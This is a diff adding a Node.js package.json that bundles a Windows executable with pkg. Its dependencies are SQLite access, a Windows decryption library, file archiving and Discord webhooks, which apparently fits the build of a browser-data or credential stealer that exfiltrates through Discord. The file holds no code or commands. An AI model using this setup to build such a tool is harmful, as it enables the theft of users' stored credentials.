@@ -1,0 +1,67 @@
+{
+  "name": "src",
+  "version": "1.0.0",
+  "main": "index.js",
+  "bin": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "MIT",
+  "description": "",
+  "dependencies": {
+    "archiver": "^7.0.1",
+    "better-sqlite3": "^11.1.2",
+    "discord-webhook-node": "^1.1.8",
+    "fast-glob": "^3.3.2",
+    "form-data": "^4.0.0",
+    "fs-extra": "^11.2.0",
+    "koffi": "^2.9.0",
+    "node-fetch": "^2.7.0",
+    "windcrypt": "^1.4.3"
+  },
+  "pkg": {
+    "assets": [
+      "./app.tgz",
+      "./app.tgz.sha256",
+      "./node_modules/koffi/build/koffi/win32_x64/koffi.node",
+      "./node_modules/better-sqlite3/build/Release/better_sqlite3.node",
+      "./node_modules/windcrypt",
+      "./node_modules/archiver/**/*",
+      "./node_modules/discord-webhook-node/**/*",
+      "./node_modules/fast-glob/**/*",
+      "./node_modules/fs-extra/**/*",
+      "./node_modules/node-fetch/**/*"
+    ],
+    "ignore": [
+      "./node_modules/string-width/**/*",
+      "./node_modules/strip-ansi/**/*",
+      "./node_modules/wrap-ansi/**/*",
+      "./node_modules/ansi-regex/**/*",
+      "./node_modules/ansi-styles/**/*",
+      "**/*.test.js",
+      "**/*.spec.js",
+      "**/__tests__/**",
+      "**/test/**",
+      "**/coverage/**",
+      "config.dev.js",
+      "config.local.json",
+      ".env.development",
+      "tmp/**",
+      "logs/**",
+      "*.log",
+      "npm-debug.log",
+      "docs/**",
+      "examples/**",
+      "README.*",
+      "CHANGELOG.*",
+      ".DS_Store",
+      "Thumbs.db",
+      ".vscode/**",
+      ".idea/**",
+      "*.bak",
+      "*.swp"
+    ]
+  }
+}
